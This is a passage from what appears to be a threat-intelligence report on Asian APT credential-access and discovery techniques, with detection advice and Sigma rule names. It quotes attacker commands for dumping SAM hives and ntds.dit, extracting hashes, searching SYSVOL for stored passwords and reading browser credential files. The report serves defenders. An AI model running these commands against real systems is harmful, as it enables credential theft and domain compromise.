the Recycle Bin and then archive them:\n\n\n$system32\\reg.exe reg save hklm\\sam c:\\$recycle.bin\\temp\\sam.hive\n\n\nExample use of commands by the group known as CopperTurtle:\n\n\nreg save HKLM\\SAM “c:\\intel\\SamBkup.hiv”\nreg save HKLM\\SYSTEM “c:\\intel\\SystemBkup.hiv”\nreg save HKLM\\SAM c:\\intel\\Sam.hiv\nreg save HKLM\\SYSTEM $windir\\System.hiv\n\n\n-----\n\n###### Detection\n\nVarious methods are available to detect the technique known as OS Credential Dumping Security Account\nManager T1003.002:\n\nThe first method is to track situations in which the reg.exe command is started to save the SAM, SYSTEM, and\nSECURITY registry hives.\n\nThe second method is to monitor all queries to these registry hives with read permissions.\n\nHKLM\\sam\\sam\\domains\\account\\users\\<RID>\nHKLM\\SYSTEM\\CurrentControlSet\\control\\lsa\\JD\nHKLM\\SYSTEM\\CurrentControlSet\\control\\lsa\\GBG\nHKLM\\SYSTEM\\CurrentControlSet\\control\\lsa\\Skew1\nHKLM\\SYSTEM\\CurrentControlSet\\control\\lsa\\Data\nHKLM\\security\\cache\nHKLM\\security\\policy\\secrets\n\nTo do so, configure an audit of queries to the registry keys listed above. Object access events occur\nfrequently. Therefore, an EDR solution and the standard Windows audit (Event ID 4663) normally tracks\nspecific critical-access objects.\n\n###### Event source Log Event ID\n\nWindows Security 4688, 4663\n\nSysmon Sysmon 1\n\n###### SIGMA rules\n\n   - Sigma-Generic-Detected Access to SAM, SYSTEM and SECURITY registry hives\n\n   - Sigma-Generic-Dumping SAM via Command Line\n\n\n-----\n\n###### OS Credential Dumping: NTDS T1003.003\n\n\n###### Basic description\n\n**NTDS.dit is the main Windows Active Directory (AD) database that contains information about users, groups,**\ncomputers, and other objects in a network domain environment.\n\nDatabase files, transaction logs, and checkpoint files are usually stored in the C:\\Windows\\NTDS directory on\nall domain controllers.\n\nAttackers may use password hashes directly from the NTDS.dit file to achieve their objectives. If the attacker\nhas already taken control of the domain, it is useful to hack the user passwords because users often re-use\nthe same passwords on systems connected to a domain and on their personal devices that are not connected\nto the domain.\n\nTo gain access to the NTDS.dit file on a domain controller, the actor must already have administrative access\nto Active Directory. Alternatively, the attackers can compromise the backup tool of the domain infrastructure\nand copy the NTDS.dit file.\n\nAs soon as the attacker gains access to the file system of the domain controller, they can save the NTDS.\ndit file and the HKEY_LOCAL_MACHINE\\SYSTEM, registry hive, which contains the boot key required for\ndecrypting the NTDS.dit file.\n\nKeep in mind that Active Directory maintains a lock on the NTDS.dit file, thereby preventing direct copying of\nthis file. However, attackers have several ways to bypass this restriction, including the following:\n\n- Use the Volume Shadow Copy Service (VSS) to create a snapshot of the volume and then extract the NTDS.\ndit file from this snapshot.\n\n- Use built-in tools such as DSDBUtil.exe or NTDSUtil.exe to generate Active Directory installation media files.\n\n- Use PowerShell tools such as Invoke-NinjaCopy from PowerSploit to copy files even while they are in use.\n\n- Stop Active Directory (though this would most likely result in detection and potential harm to the domain\ninfrastructure).\n\n###### Examples of procedures\n\n**Example 1**\n\nOne Asian APT group used a custom-written console utility to copy files from one directory into another\ndirectory using functions of the vssapi.dll library (API shadow copy functions). It was used to perform a dump\nof ntds.dit.\n\n\n-----\n\nFigure 61 Decompiled malicious utility using vssapi.dll\n\nUsage example:\n\nc:\\programdata\\microsoft\\sc64.exe C:\\Windows\\ntds\\ntds.dit c:\\programdata\\microsoft\\ntds.dit\n\n\n-----\n\n**Example 2**\n\nAnother popular way to dump ntds.dit is to use the ntdsutil.exe utility.\n\nAsian APT groups have been observed using this utility in a multitude of campaigns.\n\nNTDSUtil is a console utility for working with an AD database (ntds.dit) that lets you create IFM for DCPromo.\nIFM (Install from Media) is used with DCPromo so that domain data does not need to be copied over the\nnetwork from a domain controller (DC) to a server that is being converted into a new domain controller.\n\nNTDSUTIL can be used to extract NTDS.dit locally on a DC by creating an IFM (shadow copy of VSS).\n\nExample use of NTDSUTIL via PowerShell:\n\n\nPowerShell ntdsutil.exe 'ac i ntds' 'ifm' 'create full C:\\Windows\\temp\\ztemp' q q\n\n\nExample use of ntdsutil via cmd.exe:\n\n\nntdsutil \"ac i ntds\" \"ifm\" \"create full C:\\Windows\\temp\" q q\n\n\n**Example 3**\n\nWe also encountered use of the NTDSDumpEx utility, which extracts data from a saved ntds.dit:\n\n\nnd.exe -d ntds.dit -o hash.txt -s system.hiv -h -p -m\n\n\n-----\n\n###### Detection\n\nTo detect use of the technique known as OS Credential Dumping: NTDS T1003.003, you can track running of\nutilities used for an NTDS.dit dump such as NTDSUTIL, or tools used for shadow copying.\n\nAn EDR solution can also track calls of API functions used to shadow copy sensitive files such as NTDS.dit,\nSAM, SYSTEM, and SECURITY.\n\n###### Event source Log Event ID\n\nWindows Security 4688\n\nSysmon Sysmon 1\n\n###### SIGMA rules\n\n   - Sigma-Generic-Saving ndts.dit via ntdsutil.exe\n\n   - Sigma-Generic-Copying ntds.dit from Volume Shadow Copy\n\n\n-----\n\n###### Unsecured Credentials T1552\n\n\n###### Basic description\n\nThe technique known as Unsecured Credentials T1552 includes methods used by attackers to detect and\nobtain system account credentials that are unprotected or stored insecurely. This technique is used in\nscenarios when passwords, API keys, certificates, or other account credentials are stored or transmitted in an\nunsecured or unreliable format or location.\n\n\n-----\n\n###### Unsecured Credentials: Credentials In Files T1552.001\n\n\n###### Basic description\n\nThe technique known as Unsecured Credentials: Credentials In Files T1552.001 obtains account credentials\nfrom files or documents that are stored in an unsecured or poorly protected format. Threat actors use these\nfiles to collect confidential information, such as usernames, passwords, API keys, or other account credentials.\n\nThis technique relies on the fact that people and companies often store account credentials in various files,\nincluding configuration files, scripts, logs, and other types of documentation. These files may be inadvertently\nleft accessible to unauthorized users or may be stored in unsecured locations, which means that attackers can\neasily obtain them.\n\nAfter attackers detect files containing account credentials, they can use various methods to extract this\ninformation. These methods may include using regular expressions to manually check files, or using templates\nto search for relevant data. They can also use automated parsing tools to extract account credentials from\nstructured files such as XML, JSON, or configuration files.\n\n###### Examples of procedures\n\n**Example 1**\n\nIn most of the observed attacks involving Asian APT groups, we noticed commands that were used to\nsearch for unsecured account credentials in the SYSVOL folder, which may store scripts for use in a domain\ninfrastructure. Attackers most frequently attempt to find a local administrator password assigned in a GPO:\n\n\n$system32\\cmd.exe /C dir /s /a \\\\dc\\SYSVOL\\dc.domain.local\\*.xml\n\n\nHere is a search for the word \"cpassword\":\n\n\n$system32\\cmd.exe /C findstr /s /i \"cpassword\" \\\\dc\\SYSVOL\\*.xml\n\n\n-----\n\n**Example 2**\n\nWhile investigating one of the incidents, we also found that the attackers obtained account credentials from\nthe PowerShell script Join<username>1.ps1, which contained the password for the user <username>.\n\n**Example 3**\n\n\nHere is another example of searching for sensitive data in user directories:\n\nwhere /f /t /r \\\\<hostname>\\C$\\users\\<username>\\ *.doc *.docx *.xls *.xlsx *.ppt *.pptx *.pdf *.amr *.tif\n*.tiff *.rtf | findstr pass\n\n###### Detection\n\nYou can detect this technique by looking for process creation events. In the command line, you can look for\nsigns of a template search, such as \"password\" and \"secret\". Aside from process creation events, you can also\ntrack script execution events, such as PowerShell scripts.\n\nThe primary way to detect this technique is to use decoy files (honeypots). For example, these decoy files can\nhave names containing the following words:\n\n   - “password”\n\n   - “secret”\n\n   - “passport”\n\n   - “admin”\n\n   - “accounts”\n\n    - “wallets”\n\nYou must configure an object access audit for these decoy files. Any processes that attempt to access these\nfiles must be inspected for malicious activity.\n\n###### Event source Log Event ID\n\nWindows Security 4688, 4663\n\nSysmon Sysmon 1\n\n###### SIGMA rules\n\n   - Sigma-Generic-Extracting Credentials from Files via PowerShell\n\n\n-----\n\n###### Credentials from Password Stores T1555\n\n\n###### Basic description\n\nTo obtain user credentials, APT groups try to access common places used to store passwords. Passwords are\nstored in multiple locations in the operating system, including in third-party applications such as browsers or\npassword managers. After obtaining credentials, attackers can use them for lateral movement and to access\nrestricted information.\n\n\n-----\n\n###### Credentials from Password Stores: Credentials from Web Browsers T1555.003\n\n\n###### Basic description\n\nEspecially popular among password stealers, the technique known as Credentials from Password Stores:\nCredentials from Web Browsers T1555.003 obtains account credentials that are stored in browsers. After\nretrieving user account credentials from browsers, attackers can use them in a domain infrastructure because\nusers often let browsers save the domain passwords that are used to access internal services via ADFS.\n\nHere are some locations where popular browsers store files containing sensitive data:\n\n\nGoogle Chrome\n\nMozilla Firefox\n\nOpera\n\nMicrosoft Edge\n\n\n$user\\$appdata\\Google\\Chrome\\User Data\\.*\\Bookmarks\n$user\\$appdata\\Google\\Chrome\\User Data\\.*\\Cookies\n$user\\$appdata\\Google\\Chrome\\User Data\\.*\\Login Data\n$user\\$appdata\\Google\\Chrome\\User Data\\.*\\Web Data\n$user\\$appdata\\Google\\Chrome\\User Data\\.*\\Web Data-journal\n$user\\$appdata\\Google\\Chrome\\User Data\\Local State\n\n$user\\$appdata\\Mozilla\\Firefox\\Profiles\\.*\\cookies\n$user\\$appdata\\Mozilla\\Firefox\\Profiles\\.*\\key3.db\n$user\\$appdata\\Mozilla\\Firefox\\Profiles\\.*\\key4.db\n$user\\$appdata\\Mozilla\\Firefox\\Profiles\\.*\\logins.json\n$user\\$appdata\\Mozilla\\Firefox\\Profiles\\.*\\places.sqlite\n\n$user\\$appdata\\Opera Software\\Opera Stable\\User Data\\.*\\Bookmarks\n$user\\$appdata\\Opera Software\\Opera Stable\\User Data\\.*\\Cookies\n$user\\$appdata\\Opera Software\\Opera Stable\\User Data\\.*\\Login Data\n$user\\$appdata\\Opera Software\\Opera Stable\\User Data\\.*\\Web Data\n$user\\$appdata\\Opera Software\\Opera Stable\\User Data\\Local State\n$user\\$appdata\\Opera\\Opera Next\\User Data\\.*\\Bookmarks\n$user\\$appdata\\Opera\\Opera Next\\User Data\\.*\\Cookies\n$user\\$appdata\\Opera\\Opera Next\\User Data\\.*\\Login Data\n$user\\$appdata\\Opera\\Opera Next\\User Data\\.*\\Web Data\n$user\\$appdata\\Opera\\Opera Next\\User Data\\Local State\n\n$user\\$appdata\\Microsoft\\Edge\\User Data\\.*\\Bookmarks\n$user\\$appdata\\Microsoft\\Edge\\User Data\\.*\\Cookies\n$user\\$appdata\\Microsoft\\Edge\\User Data\\.*\\Login Data\n$user\\$appdata\\Microsoft\\Edge\\User Data\\.*\\Web Data\n$user\\$appdata\\Microsoft\\Edge\\User Data\\Local State\n\n\n-----\n\n###### Examples of procedures\n\n**Example 1**\n\nIn the incident in Malaysia, we detected a sample that gathers account credentials from a browser:\n\n\ncmd /c C:\\Windows\\avpui.exe\n\n\nBelow is a log file generated by a malicious program:\n\nFigure 62 Log file generated by malware\n\n**Example 2**\n\nAnother way to collect passwords from browsers was found in a DLL Hijacker sample:\n\n\nC:\\Windows\\Temp\\ingame_64.exe\nMD5: F69926D69B648946D07A2EEFC2FEFC9B\nC:\\Windows\\Temp\\ingame.dll\nMD5: C53D8D178E3EB78F01C1EFECFA7EA417\n\n\n-----\n\nThe attackers brought their own legitimate file and malicious library. When they ran the legitimate file, the\nmalicious library was loaded and executed:\n\ningame_64.exe -echo c\n\nThe following log files were created:\n\n000C29A434B2-c-chrome-user-01-0-Default.log\n000C29A434B2-c-edge-user-01-0-Default.log\n\n###### Detection\n\nThe primary way to detect the technique known as Credentials from Password Stores: Credentials from\nWeb Browsers T1555.003 is to track attempts by non-standard processes (other than legitimate browser\nprocesses) to access browser files containing user account credentials.\n\n###### Event source Log Event ID\n\nWindows Security 4663\n\n###### SIGMA rules\n\n   - Sigma-Generic-Suspicious Access to Credentials from Web Browsers\n\n\n-----\n\n##### Discovery TA0007\n\n###### Software Discovery T1518\n\n Basic description\n\nReconnaissance of the specific software in a company may provide valuable information to attackers. When\nattackers know the specific applications being used in a company, they can use them for malicious purposes.\n\nSoftware can be analyzed to identify specific applications or systems that have vulnerabilities that the\nattackers can exploit. Attackers can also identify software that stores sensitive data, provides remote access,\nor has administrative privileges.\n\nAttackers may masquerade as legitimate company software to conceal their malicious activity and minimize\ndetection by security products.\n\nFor example, some APT groups avoid attacking systems that have code writing applications, SysInternals\nmonitoring programs, or programs used to analyze malware and network traffic such as WireShark installed.\n\n###### Examples of procedures\n\nInformation about installed software can be gathered in different ways.\n\n**Example 1**\n\nAn APT group that attacked government agencies in Belarus and Russia used the dir command to display a list\nof files in a directory:\n\ndir \\\\<ip>\\c$\\\"program files\" /od\ndir \\\\<ip>\\c$\\windows\\system32\\tasks\n\n**Example 2**\n\nOperators also used the wmic utility to get a list of installed software:\n\ncmd /c wmic product get name\n\n\n-----\n\n**Example 3**\n\nIn the Indonesian incident, the attackers checked for the presence of a Kaspersky Endpoint Security for\nWindows agent and its version:\n\n\ncmd.exe /C dir \"$programfiles\\Kaspersky Lab\\Kaspersky Endpoint Security for Windows\\version.txt\"\ncmd.exe /C type \"$programfiles\\Kaspersky Lab\\Kaspersky Endpoint Security for Windows\\version.txt\"\n\n\n**Example 4**\n\nAnother APT group also used the dir command:\n\n\ndir /a \"c:\\program files\\*.*\" >> C:\\Windows\\Web\\systeminfo.txtbb\ndir /a \"c:\\Program Files (x86)\\*.*\" >> C:\\Windows\\Web\\systeminfo.txtbb\n\n\n###### Detection\n\nDetection rules for identifying reconnaissance of installed software can be generated based on the command\nlines in the examples presented above. This may include the following:\n\n###### 1\n\nDir command for enumerating directories in C:\\Program Files\\ and C:\\Program Files ( x86)\\\n\n###### 2\n\nUse of the Wmic console utility\n\n###### 3\n\nReg.exe utility to query the installed software in the Windows registry:\n\n\nreg.exe query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall /S /v DisplayName\nreg.exe query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall /S /v DisplayVersion\n\n\n-----\n\nPowerShell:\n\n\nGet-WmiObject -Class Win32_Product\n\nGet-ChildItem \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\"\n\n\nDetection of this technique is complicated by the fact that all of these actions can also be performed for\nlegitimate purposes by an administrator or other authorized person. To reduce the likelihood of false positives,\nyou are advised to employ multiple rules that are aimed at detecting various Discovery techniques. For\nexample, detection can be based on 3–5 rules triggered within a span of 10 minutes. For each organization,\nyou must clarify and exclude certain activity by profiling the legitimate activity that occurs in the particular\norganization.\n\n###### Event source Log Event ID\n\nWindows Security 4688\n\nSysmon Sysmon 1\n\nMicrosoft-Windows-PowerShell/\nPowerShell 4103, 4104\nOperational\n\n###### SIGMA rules\n\n- Sigma-Generic-Software Discovery via Standard Windows Utilities\n\n- Sigma-Generic-Security Software Discovery via wmic\n\n- Sigma-Generic-Discovery Component Object Model Keys via PowerShell\n\n\n-----\n\n###### System Service Discovery T1007\n\n Basic description\n\nWindows OS services are used by attackers for various objectives. For instance, some services are used\nto establish persistence in the system, others are used for privilege elevation, and some are used to simply\nexecute code in the context of a service process. Attackers use the System Service Discovery technique to\nview the running services and to search for information about a specific service.\n\nThere are several ways to view the installed services in Windows:\n\n###### 1\n\nStandard tools of the operating system\n\n###### 2\n\nPowerShell cmdlets\n\n###### 3\n\nWMI\n\n###### 4\n\nWindows registry\n\nWMI can be used with standard tools as well as with PowerShell, so examples of its use are also presented in\nthe tables below.\n\n\n-----\n\n###### Standard tools  Examples of the operating system\n\nsc query\nsc query type= service\nsc queryex\nsc qc\nsc qdescription\n\nsc\n\nsc qtriggerinfo\nsc qprivs\nsc qfailure\nsc qfailureflag\nsc qsidtype\n\ntasklist\ntasklist\ntasklist /svc\n\nnet net start\n\nnet1 net1 start\n\ndriverquery driverquery\n\nwmic service [get …]\nwmic\nwmic process [get …]\n\n###### PowerShell cmdlets Examples\n\ngsv\nGet-Service\nGet-Service\n\ngps\nGet-Process ps\nGet-Process | Where-Object {$_.SessionId -eq 0}\n\nGet-SystemDriver Get-SystemDriver\n\ngwmi\nGet-WmiObject Get-WmiObject -Query “select * from Win32_Service”\nGet-WmiObject -Class Win32_Service\n\nGet-CimInstance Get-CimInstance -ClassName Win32_Service\n\n\n-----\n\n###### WMI Classes\n\nCIM_Process\n\nCIM_Service\n\nCIM_ServiceComponent\n\n\nCIM_ServiceServiceDependency\n\nWin32_Process\n\nWin32_Service\n\nWin32_SystemDriver\n\nTo conduct reconnaissance of services by using the registry, attackers can simply view the contents of the\n**HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services tree.**\n\n###### Examples of procedures\n\n**Example 1**\n\nWhen attacking industrial facilities, Asian APT groups often conduct a pinpoint inspection of services. They do\nthis because of their frequent use of the DLL Hijacking technique, in which they check whether the target host\nis running a service that is vulnerable to this type of attack.\n\n%SYSTEMROOT%\\System32\\sc.exe query <service_name>\n\n\n-----\n\n**Example 2**\n\nAs part of their reconnaissance for another attack, attackers saved the output of the tasklist utility to a file in a\ntemporary directory:\n\n\ndir \\\\<ip>\\c$\\windows\\system32\\tasks\ncmd /c tasklist >$temp\\temp.txt\ntasklist\n\n\n**Example 3**\n\nIn one attack, an Asian APT group used the tasklist utility to get the PID of the lsass process from a list of\nservices:\n\n\n$system32\\cmd.exe /C tasklist /svc | findstr lsass\n\n\n**Example 4**\n\nSome of the more sophisticated Asian APT groups also combine service discovery methods like in this\nexample of an attack targeting an industrial facility:\n\n\ncscript.exe //nologo wmic.vbs /cmd 10.0.0.10 [domain]\\[user] [password] \"sc query wam\"\n\n\n###### Detection\n\nProcess creation events can be used to detect discovery of services that is conducted using standard tools\nin the operating system. Discovery of services via PowerShell can be detected by looking for Windows Event\nID 4104. However, keep in mind that a script may be obfuscated. If an attacker conducts discovery of services\nby using the registry, this can be detected by looking for process creation events (EventId 4688 or Sysmon 1) in\nwhich the CommandLine shows the registry hive containing information about services.\n\nDetection of this technique is complicated by the fact that most of these actions can also be performed\nfor legitimate purposes by an administrator or other authorized person. To reduce the likelihood of false\npositives, you are advised to employ multiple rules that are aimed at detecting various Discovery techniques.\nFor example, detection can be based on 3–5 rules triggered within a span of 10 minutes. For each organization,\nyou must clarify and exclude certain activity by profiling the legitimate activity that occurs in the particular\norganization.\n\n\n-----\n\n###### Event source Log Event ID\n\nWindows Security 4688\n\nMicrosoft-Windows-PowerShell/\nWindows 4103, 4104\nOperational\n\nSysmon Sysmon 1\n\n###### SIGMA rules\n\n   - Sigma-Generic-System Service Discovery via Standard WIndows Utilities\n\n   - Sigma-Generic-System Service Discovery via PowerShell\n\n   - Sigma-Generic-System Service Discovery via Registry\n\n   - Sigma-Generic-System Service Discovery via wmic\n\n\n-----\n\n###### System Information Discovery T1082\n\n\n###### Basic description\n\nAttackers use this technique to gather information about the target system or network. This information can\ninclude the hostname, operating system version, open ports, running services, installed software, and other\nrelevant data. The collected information is used to understand the context of the environment and to plan\nfurther attack vectors.\n\n###### Examples of procedures\n\nDuring our analysis of Asian APT groups, we observed the use of standard tools for obtaining system\ninformation.\n\n**Example 1**\n\nThe attackers used the systeminfo utility the most frequently. It shows detailed information about the\nconfiguration of the computer and operating system, data on the PC manufacturer, RAM, network adapter,\nBIOS/UEFI version, configured time zone, localization, and available support for virtualization technologies.\n\n\nC:\\Windows\\system32\\cmd.exe /C systeminfo\n\n\n**Example 2**\n\nAttackers also use the hostname command to get the name of the victim's machine.\n\n\nC:\\Windows\\system32\\cmd.exe /C hostname\n\n\n**Example 3**\n\nExample of using the diskpart utility to get a list of volumes:\n\n\ncmd /c echo list volume |diskpart\n\n\n-----\n\n**Example 4**\n\nAn executable file observed in one attack executes discovery commands via cmd and writes their results to a\nfile named ~dep222.tmp. 0x5D decryption key.\n\n\nC:\\Windows\\adobe.exe\nMD5: 6117854AA463D953DAE2AC8062FEDD5E\n\n\nCommands executed by the sample:\n\n\ncmd /c systeminfo >> $user\\$temp\\~dep22\ncmd /c dir >> $user\\$temp\\~dep22\ncmd /c netstat -ano >> $user\\$temp\\~dep22\ncmd /c tasklist /v >> $user\\$temp\\~dep22\ncmd /c net start >> $user\\$temp\\~dep22\ncmd /c net user >> $user\\$temp\\~dep22\ncmd /c ipconfig /all >> $user\\$temp\\~dep22\n\n\n###### Detection\n\nThe main way to detect the System Information Discovery T1082 technique is to look for process creation\nevents, which can be used to identify suspicious command-line parameters such as systeminfo or hostname.\n\nDetection of this technique is complicated by the fact that all of these actions can also be performed for\nlegitimate purposes by an administrator or other authorized person. To reduce the likelihood of false positives,\nyou are advised to employ multiple rules that are aimed at detecting various Discovery techniques. For\nexample, detection can be based on 3–5 rules triggered within a span of 10 minutes. For each organization,\nyou must clarify and exclude certain activity by profiling the legitimate activity that occurs in the particular\norganization.\n\n\n-----\n\n###### Event source Log Event ID\n\nWindows Security 4688\n\nSysmon Sysmon 1\n\n###### SIGMA rules\n\n   - Sigma-Generic-System Information Discovery via Standard Windows Utilities\n\n\n-----\n\n###### System Network Configuration Discovery T1016\n\n\n###### Basic description\n\nThe technique known as System Network Configuration Discovery is employed during the attack stage in\nwhich the attackers gather information about network settings and parameters. The collected data can be\nused by the attackers for communication with their C2, lateral movement, and/or pivoting.\n\nThere are many ways to get information about the network configuration in Windows. For example, you can\nview the ARP cache, routes, network interfaces, and much more.\n\nOutside of an attack, these actions are frequently performed by administrators/engineers for network\nconfiguration and troubleshooting.\n\n###### Examples of procedures\n\nIn one attack targeting government organizations in Russia, an Asian APT group redirected the output of\nutilities to a text file in a temporary directory:\n\n\ncmd /c route print > $temp\\1.txt\ncmd /c ipconfig /displaydns > $temp\\1.txt\n\n\nDuring another attack, an advanced Asian APT group used the ipconfig utility directly:\n\n\nipconfig /all\n\n\nSome samples from Asian APT groups also contact online services to get a public IP address and thereby find\nout the geographical location of their target host.\n\n\n-----\n\n###### Detection\n\nSome correlation rules aimed at identifying network configuration discovery activity will generate a large\nnumber of false positive detections. To reduce the number of false positives, you can combine multiple rules\nto trigger an alert. For example, you can configure an alert to be generated when three discovery rules are\ntriggered within a period of 10 minutes on one host. The specific number of rules and the applicable time period\nfor a triggered alert should be appropriately configured based on the typical activity in the infrastructure.\n\n###### Event source Log Event ID\n\nWindows Security 4688\n\nSysmon Sysmon 1, 3, 22\n\n###### SIGMA rules\n\n   - Sigma-Generic-System Network Configuration Discovery via Standard Windows Utilities\n\n   - Sigma-Generic-Network Connection to Online IP Resolution Web Service (EventID 3)\n\n   - Sigma-Generic-Network Connection to Online IP Resolution Web Service (EventID 22)\n\n\n-----\n\n###### System Network Connections Discovery T1049\n\n\n###### Basic description\n\nThe technique known as System Network Connections Discovery is used by threat actors to gather\ninformation about active network connections of a compromised host so that they can then use this data for\nLateral Movement, Pivoting and/or Credential Access (under certain conditions).\n\nWindows provides APIs, utilities, and PowerShell cmdlets to collect this type of information:\n\n###### WinAPI Commands Cmdlets PowerShell\n\n\nGetTcpTable, GetUdpTable,\nGetTcp6Table,\nGetTcp6Table2, GetUdpTable,\nWTSEnumerateSessionsA/\nWTSEnumerateSessionsW,\nWTSEnumerateSessionsExA,\nWTSEnumerateSessionsExW,etc\n\n###### Examples of procedures\n\n\nnetstat, query session, qwinsta, query\nuser, quser, net use\n\n\nGet-NetTCPConnection\nGet-IscsiConnection\nGet-SmbConnection\nGet-SmbMultichannelConnection\nGet-VpnConnection\n\n\nAsian APT groups frequently use the System Network Connections Discovery technique. To gather\ninformation about active sessions, attackers use the qwinsta command (the same as a query session).\n\n**Example 1**\n\nFor example, in an attack targeting government organizations in Russia, an Asian APT group used qwinsta and\n**netstat to implement this technique. WMI is used to start these utilities on remote hosts:**\n\n\nwmic /node:<ip> /user:<domain>\\<username> /password:<password> process call create \"cmd.exe /c\nqwinsta > $temp\\1.txt\nwmic /node:<ip> /user:<domain>\\<username> /password:<password> process call create \"cmd.exe /c\nnetstat -ano > $temp\\1.txt\n\n\n-----\n\n**Example 2**\n\nDuring another attack, an Asian threat actor used netstat with parameters:\n\nnetstat -nato\n\n**Example 3**\n\nIn another incident that we observed, an Asian APT group used netstat after persisting in the system by\nservice creation with the executable file named c:\\programdata\\usoshared\\hpnotifications.exe:\n\n$system32\\cmd.exe /C netstat -ano -p tcp | findstr \"EST\"\n\n###### Detection\n\nLike many other techniques of the Discovery tactic, this technique is difficult to detect because its typical\nactions may be legitimately performed by administrators and/or users.\n\nDue to the large amount of legitimate activity matching this technique, you can link multiple granular, time-\nbased correlation rules to effectively identify malicious activity. For example, if there are multiple discovery\nrules, you can configure an alert to be generated when at least three of the rules are triggered on one host\nwithin a span of 10 minutes. Naturally, the specific parameters should take into account your typical internal\nactivity.\n\n###### Event source Log Event ID\n\nWindows Security 4688\n\nMicrosoft-Windows-PowerShell/\nWindows 4103, 4104\nOperational\n\nSysmon Sysmon 1\n\n\n-----\n\n###### SIGMA rules\n\n   - Sigma-Generic-System Network Connections Discovery via PowerShell\n\n   - Sigma-Generic-System Network Connections Discovery via Standard Windows Utilities\n\n\n-----\n\n###### System Time Discovery T1124\n\n\n###### Basic description\n\nThe technique known as System Time Discovery is employed by attackers together with other techniques\nduring the reconnaissance stage. The system time helps identify the victim's time zone, which also helps\nprovide an approximate location. APT groups often pursue specific objectives and victims, and the location of\na particular system helps identify useful targets. Attackers may also check the current time of a host before\ncreating a scheduled task.\n\nThe current time of a system can be determined in several ways:\n\n- In the command line by using the time utility\n\n- Using a PowerShell cmdlet: Get-Date\n\n- WinAPI calls: GetSystemTime()\n\n###### Examples of procedures\n\n**Example 1**\n\nWe observed time determination commands among many other discovery commands. When conducting\nreconnaissance, Asian APT groups often redirected the output of commands to a specific file, then read the\ndata and forwarded it to a command center.\n\n\ncmd.exe /c C: & cd\\ & cd \"\" & time /t\ncmd /c time /t >$temp\\temp.txt\n\n\n**Example 2**\n\nIn one attack, the net.exe utility was used to determine the time. The following command displays the time\nfrom the domain server serving as the timeserver.\n\n\nnet.exe time /do\n\n\n-----\n\n**Example 3**\n\nAsian APT groups often use specially prepared scripts in which they combine all of the main discovery\ncommands necessary for conducting an attack, and save the results to a file. Below is a command snippet\nfrom a script:\n\n\ntime /t >> C:\\Windows\\Web\\systeminfo.txtbb\n\n\n###### Detection\n\nThis technique can be detected by tracking commands that determine the system time. However, these\ncommands may also be run during legitimate activity.\n\nAs was described earlier in other Discovery techniques, it is best to use a combination of detection rules aimed\nat techniques from the Discovery tactic.\n\n###### Event source Log Event ID\n\nWindows Security 4688\n\nMicrosoft-Windows-PowerShell/\nWindows 4103, 4104\nOperational\n\nSysmon Sysmon 1\n\n###### SIGMA rules\n\n- Sigma-Generic-Sigma-Generic-System Time Discovery via PowerShell\n\n- Sigma-Generic-System Time Discovery via standard windows utilities\n\n\n-----\n\n###### Permission Groups Discovery T1069\n\n Basic description\n\nAttackers explore lists of groups, such as local groups, domain groups, and groups of cloud services. They\nanalyze the permissions of these groups to identify accessible user accounts and user groups, determine\nwhich users belong to which groups, and identify their privileges. This data allows attackers to get additional\ninformation about the compromised system that will be used for further actions.\n\n\n-----\n\n###### Permission Groups Discovery: Domain Groups T1069.002\n\n Basic description\n\nAfter an attacker infiltrates a host and obtains the capability to execute commands, they must look around\nand get their bearings. For example, they can identify members of groups in a Windows OS by using the\ndsquery utility:\n\ndsquery group -name \"AllowUSB\" | dsget group -members\n\nOr they can use the net utility:\n\nnet group \"maingroup\" /domain\n\n###### Examples of procedures\n\nWhile writing this report, we encountered the following examples of this technique in action:\n\n$system32\\cmd.exe /C net group /do\n$system32\\cmd.exe /C net group \"domain admins\" /domain\n$system32\\cmd.exe /C net user domain_admin /domain\nnet group \"domain users\" /do\nnet group \"domain computers\" /do\nGet-MsolGroup\nGet-MsolGroup -All\nGet-MsolRole\nGet-MsolRoleMember -ObjectId 2b745bdf-0803-4d80-****\nhelp Get-MsolRoleMember\nGet-MsolRoleMember -RoleObjectId 2b745bdf-0803-4d80-****\nGet-MsolRoleMember -RoleObjectId 62e90394-69f5-4237-****\n\n\n-----\n\n###### Detection\n\nThis technique can be detected by looking at process creation events, analyzing data from network traffic if\ndomain groups are queried, and tracking script execution events such as PowerShell scripts.\n\n###### Event source Log Event ID\n\nWindows Security 4688\n\nMicrosoft-Windows-PowerShell/\nWindows 4103, 4104\nOperational\n\nSysmon Sysmon 1\n\n###### SIGMA rules\n\n   - Sigma-Generic-Permission Local Groups Discovery via wmic\n\n   - Sigma-Generic-Local Groups Discovery via net.exe\n\n   - Sigma-Generic-Local Groups Discovery via PowerShell\n\n   - Sigma-Generic-Domain Groups Discovery via net.exe\n\n   - Sigma-Generic-Groups Discovery via PowerShell\n\n\n-----\n\n###### Network Share Discovery T1135\n\n Basic description\n\nLateral movement of attackers through the network is usually preceded by searches for network folders\nand drives. A network shared folder is a shared resource for computers that are joined into one network. This\nallows users to access file directories in various systems over the network. Shared use of files on a Windows\nnetwork is provided via the SMB protocol.\n\nFor threat actors, a shared network shared folder provides another vector for lateral movement and another\ndata collection resource.\n\nTo search for shared network resources, attackers use the following:\n\n###### 1\n\nNet.exe utility:\n\nnet view\nnet use\nnet share\n\n###### 2\n\nPowerShell: PowerShell get-smbshare\n\n###### 3\n\nWMI: PowerShell Get-WmiObject -Class Win32_Share\n\n###### 4\n\nWin API: NetShareEnum()\n\n\n-----\n\n###### Examples of procedures\n\n**Example 1**\n\nIn one attack, an Asian APT group used the net.exe utility to view network shared folders:\n\n\n$system32\\cmd.exe /C net view \\\\remotesystem\n\n\n**Example 2**\n\nIn one incident, an Asian APT group operator conducted reconnaissance through a reverse shell:\n\n\ncmd.exe /c C: & cd\\ & cd \"\" & net use\n\n\n**Example 3**\n\nHere is a discovery script snippet showing the main commands used to search for network shared folders and\ncomputers on a network:\n\n\nnet use >> C:\\Windows\\Web\\systeminfo.txtbb\nnet share >> C:\\Windows\\Web\\systeminfo.txtbb\nnet view >> C:\\Windows\\Web\\systeminfo.txtbb\nnet view /domain >> C:\\Windows\\Web\\systeminfo.txtbb\n\n\n**Example 4**\n\nWe also encountered the use of nmap to search for network resources:\n\n\nnmap -p 445,3389 -T3 -v -n -Pn --open 